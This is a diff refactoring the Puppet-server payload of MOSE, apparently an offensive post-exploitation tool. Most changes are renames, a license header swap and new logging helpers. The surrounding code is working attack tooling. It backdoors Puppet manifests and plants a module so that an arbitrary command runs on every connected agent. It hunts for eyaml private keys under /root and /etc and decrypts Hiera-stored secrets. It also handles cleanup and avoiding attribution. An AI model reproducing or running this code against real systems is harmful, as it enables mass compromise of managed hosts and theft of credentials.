@@ -1,17 +1,13 @@
-package main
+// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
+// Under the terms of Contract DE-NA0003525 with NTESS,
+// the U.S. Government retains certain rights in this software.
 
-// Copyright 2019 Jayson Grace. All rights reserved
-// Use of this source code is governed by a MIT-style
-// license that can be found in the LICENSE file.
+package main
 
 import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"github.com/fatih/color"
-	"github.com/gobuffalo/packr/v2"
-	"github.com/l50/goutils"
-	"github.com/master-of-servers/mose/pkg/moseutils"
 	"io/ioutil"
 	"log"
 	"os"
@@ -19,6 +15,10 @@ import (
 	"regexp"
 	"strings"
 	"text/template"
+
+	"github.com/gobuffalo/packr/v2"
+	utils "github.com/l50/goutils"
+	"github.com/master-of-servers/mose/pkg/moseutils"
 )
 
 type eyamlKeys struct {
@@ -26,7 +26,7 @@ type eyamlKeys struct {
 	privateKey string
 }
 
-type Command struct {
+type command struct {
 	ClassName string
 	CmdName   string
 	Cmd       string
@@ -37,18 +37,19 @@ type Command struct {
 var (
 	a               = CreateAgent()
 	cleanup         bool
-	bdCmd           = a.BdCmd
-	msg             = color.Green
+	cmd             = a.Cmd
+	debug           = a.Debug
 	osTarget        = a.OsTarget
 	moduleName      = a.PayloadName
 	uploadFileName  = a.FileName
-	uploadFilePath  = a.FilePath
+	uploadFilePath  = a.RemoteUploadFilePath
 	cleanupFile     = a.CleanupFile
 	puppetBackupLoc = a.PuppetBackupLoc
 )
 
 func init() {
-	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
+	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location specified in settings.json")
+	flag.Parse()
 }
 
 func cleanAgentOutput(cmdOut string) []string {
@@ -67,10 +68,14 @@ func getAgents() []string {
 		cmdArr := strings.Fields(cmd)
 		cmdOut, err = utils.RunCommand(cmdArr[0], cmdArr[1:]...)
 		if err == nil {
-			log.Printf("Running %v", cmd)
+			if debug {
+				log.Printf("Running %v\n", cmd)
+			}
 			break
 		}
-		log.Printf("%v not working on this system", cmd)
+		if debug {
+			log.Printf("%v is not working on this system\n", cmd)
+		}
 	}
 
 	agents := cleanAgentOutput(cmdOut)
@@ -87,7 +92,7 @@ func getAgents() []string {
 
 // getModules will get existing modules on the puppet server and output them
 func getModules(moduleLoc string) []string {
-	var o []string
+	var modules []string
 	// Because the format of the data may vary, we opt to use maps
 	var jsonOut map[string]interface{}
 
@@ -97,19 +102,19 @@ func getModules(moduleLoc string) []string {
 	}
 	err = json.Unmarshal([]byte(cmdOut), &jsonOut)
 	if err != nil {
-		log.Fatalf("Error: Unable to unmarshal %v", jsonOut)
+		log.Printf("Error: Unable to unmarshal %v", jsonOut)
 	}
-	modules := jsonOut["modules_by_path"].(map[string]interface{})
-	for key, value := range modules {
+	preParsed := jsonOut["modules_by_path"].(map[string]interface{})
+	for key, value := range preParsed {
 		switch s := value.(type) {
 		default:
 		case []interface{}:
 			for _, str := range s {
-				o = append(o, fmt.Sprintf("%v:%v", key, str))
+				modules = append(modules, fmt.Sprintf("%v:%v", key, str))
 			}
 		}
 	}
-	return o
+	return modules
 }
 
 func getExistingManifests() []string {
@@ -137,7 +142,7 @@ func backupManifest(manifestLoc string) {
 		moseutils.CpFile(manifestLoc, path+".bak.mose")
 		return
 	}
-	log.Printf("Backup of the manifest (%v.bak.mose) already exists.", manifestLoc)
+	fmt.Printf("Backup of the manifest (%v.bak.mose) already exists.\n", manifestLoc)
 	return
 }
 
@@ -170,10 +175,10 @@ func getPuppetCodeLoc(manifestLoc string) string {
 }
 
 func generateModule(moduleManifest string, cmd string) bool {
-	puppetCommand := Command{
+	puppetCommand := command{
 		ClassName: moduleName,
 		CmdName:   "cmd",
-		Cmd:       bdCmd,
+		Cmd:       cmd,
 		FileName:  uploadFileName,
 		FilePath:  uploadFilePath,
 	}
@@ -218,20 +223,20 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 	moduleFolders := []string{filepath.Join(moduleLoc, "manifests")}
 	moduleManifest := filepath.Join(moduleLoc, "manifests", "init.pp")
 	if moseutils.CreateFolders(moduleFolders) && generateModule(moduleManifest, cmd) {
-		msg("Successfully created the %s module at %s", moduleName, moduleManifest)
-		msg("Adding folder %s to cleanup file", moduleFolders)
+		moseutils.Msg("Successfully created the %s module at %s", moduleName, moduleManifest)
+		fmt.Printf("Adding folder %s to cleanup file\n", moduleFolders)
 		// Track the folders for clean up purposes
 		moseutils.TrackChanges(cleanupFile, moduleLoc)
 		if uploadFileName != "" {
 			moduleFiles := filepath.Join(moduleLoc, "files")
 
 			moseutils.CreateFolders([]string{moduleFiles})
-			log.Printf("Copying  %s to module location %s", uploadFileName, moduleFiles)
+			fmt.Printf("Copying %s to module location %s\n", uploadFileName, moduleFiles)
 			moseutils.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(moduleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
 				log.Fatal(err)
 			}
-			log.Printf("Successfully copied and chmod file %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
+			moseutils.Msg("Successfully copied and set the proper permissions for %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 		}
 	} else {
 		log.Fatalf("Failed to create %s module", moduleName)
@@ -240,7 +245,7 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 
 func getSecretKeys() map[string]*eyamlKeys {
 	keys := make(map[string]*eyamlKeys)
-	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{})
+	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{}, debug)
 	if len(keyFiles) == 0 {
 		log.Fatalln("Unable to find any files containing keys used with eyaml, exiting.")
 	}
@@ -257,7 +262,9 @@ func getSecretKeys() map[string]*eyamlKeys {
 				k.publicKey = filepath.Base(key)
 
 			} else if strings.Contains(key, "private") {
-				log.Println(key)
+				if debug {
+					log.Println(key)
+				}
 				k.privateKey = b
 			}
 		}
@@ -273,7 +280,7 @@ func findHieraSecrets() {
 		return
 	}
 	secretKeys := getSecretKeys()
-	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{})
+	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{}, debug)
 
 	if len(puppetFiles) == 0 {
 		log.Fatalln("Unable to find any chef files, exiting.")
@@ -286,7 +293,7 @@ func findHieraSecrets() {
 		// Grep for ENC[
 		matches = moseutils.GrepFile(file, reg)
 		if len(matches) > 0 {
-			log.Printf("Found secret(s) in file: %s", file)
+			moseutils.Msg("Found secret(s) in file: %s", file)
 			for k := range secretKeys {
 				res, err := utils.RunCommand(eyamlFile, "decrypt",
 					"--pkcs7-public-key="+k+secretKeys[k].publicKey,
@@ -296,7 +303,7 @@ func findHieraSecrets() {
 					log.Printf("Error running command: %s decrypt -f %s %v", eyamlFile, file, err)
 				}
 				if !strings.Contains(res, "bad decrypt") {
-					msg("%s", res)
+					moseutils.Msg("%s", res)
 				}
 			}
 		}
@@ -305,7 +312,7 @@ func findHieraSecrets() {
 
 func doCleanup(manifestLocs []string) {
 	moseutils.TrackChanges(cleanupFile, cleanupFile)
-	ans, err := moseutils.AskUserQuestion("Would you like to remove all non Manifest files associated with a previous run?", osTarget)
+	ans, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
 	if err != nil {
 		log.Fatal("Quitting...")
 	}
@@ -340,8 +347,6 @@ func doCleanup(manifestLocs []string) {
 }
 
 func main() {
-	flag.Parse()
-
 	// If we're not root, we probably can't backdoor any of the puppet code, so exit
 	// This may not always be true as per https://puppet.com/blog/puppet-without-root-a-real-life-example
 	// But we are going with it as an assumption based on polling various DevOps engineers and Site Reliability engineers
@@ -357,21 +362,23 @@ func main() {
 	}
 
 	for _, manifestLoc := range manifestLocs {
-		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up.", osTarget); ans && err == nil {
+		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", osTarget); ans && err == nil {
 			backupManifest(manifestLoc)
 		} else if err != nil {
 			log.Fatal("Exiting...")
 		}
 
-		msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, bdCmd)
+		moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
 		backdoorManifest(manifestLoc)
-		createModule(manifestLoc, moduleName, bdCmd)
 		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
-		log.Printf("Modules found: %q", modules)
+		moseutils.Info("The following modules were found: %v", modules)
+		createModule(manifestLoc, moduleName, cmd)
 	}
 	agents := getAgents()
-	log.Printf("Puppet Agents found: %q", agents)
+	moseutils.Info("The following puppet agents were identified: %q", agents)
 
-	log.Println("Attempting to find secrets stored with Hiera")
+	moseutils.Info("Attempting to find secrets, please wait...")
 	findHieraSecrets()
+	moseutils.Msg("MOSE has finished, exiting.")
+	os.Exit(0)
 }
